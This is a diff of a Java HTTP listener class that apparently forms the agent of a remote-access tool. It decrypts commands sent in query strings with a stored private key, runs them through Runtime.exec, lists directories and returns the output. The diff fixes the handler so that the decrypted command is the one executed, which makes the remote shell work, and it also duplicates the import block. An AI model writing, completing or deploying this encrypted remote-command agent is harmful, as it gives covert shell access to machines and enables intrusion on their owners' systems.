@@ -13,6 +13,20 @@ import java.util.logging.Logger;
 
 import com.sun.net.httpserver.*;
 import com.tree.FileAssert;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.URI;
+import java.security.PrivateKey;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+import com.sun.net.httpserver.*;
+import com.tree.FileAssert;
 import com.cryp.AsymmetricCryptography;
 import com.logger.AdminLogger;
 
@@ -47,14 +61,14 @@ public class CommandListener extends Thread implements HttpHandler {
             PrivateKey privateKey = as.getPrivate("KeyPair/privateKey");
             String cmd = as.decryptText(query, privateKey);
             if (cmd.startsWith("!")) {
-                response = executeModule(query);
+                response = executeModule(cmd);
             } else if (cmd.startsWith("tree")) {
                 response = new FileAssert().printDirectoryTree(new File(cmd.split(" ")[1]));
             } else if (cmd.startsWith("shutdown")) {
                 response = "Goodbye";
                 running = false;
             } else {
-                response = executeCommand(query);
+                response = executeCommand(cmd);
             }
             exchange.sendResponseHeaders(200, response.length());
             OutputStream os = exchange.getResponseBody();
@@ -71,28 +85,27 @@ public class CommandListener extends Thread implements HttpHandler {
 
     public String executeCommand(String cmd) {
         try {
-
+            System.out.println("1");
             Process prss = Runtime.getRuntime().exec(cmd);
             LOGGER.log(Level.INFO, "Running Command: " + cmd);
             // Standar output
             BufferedReader stdInput = new BufferedReader(new InputStreamReader(prss.getInputStream()));
             // Error output
             BufferedReader stdError = new BufferedReader(new InputStreamReader(prss.getErrorStream()));
-
             // Read the output from the command
             String s = null;
             String output = "Here is the standard output of the command:\n";
             while ((s = stdInput.readLine()) != null) {
                 System.out.println(s);
-                output += s;
+                output += s + "\n";
             }
             output += "Here is the standard error of the command (if any):\n";
             // Read any errors from the attempted command
             while ((s = stdError.readLine()) != null) {
                 System.out.println(s);
-                output += s;
+                output += s + "\n";
             }
-
+            System.out.println(output);
             return output;
         } catch (Exception e) {
             // TODO Auto-generated catch block
